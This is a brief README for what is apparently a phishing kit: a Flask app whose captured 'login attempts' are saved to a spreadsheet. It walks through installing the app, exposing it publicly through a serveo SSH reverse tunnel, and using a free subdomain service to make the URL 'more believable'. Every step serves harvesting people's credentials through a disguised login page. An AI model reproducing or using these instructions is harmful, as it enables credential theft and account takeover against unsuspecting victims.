#! How to use:
1.Install required libraries from requirements.txt by
""pip install -r requirements.txt""
2.Run the flask application with
""python app.py"" in terminal
3.The flask app will start on your localhost:port 
host the app from your device locally using a tunnel like serveo
4.to host it on serveo open powershell and type:
""ssh -R 80:localhost:port serveo.net""
*note: replace the localhost:port with the actual address like ""127.0.0.1:50""*
5.use the generated url to open the webiste
6.Congratulations you've succsessfully completed the setup, successful login attempts would be saved in the submissions.xlsv

misc:
use services like freedns.afraid.org to generate alternative more believable URLs
(freeDNS is a free subdomain provider)
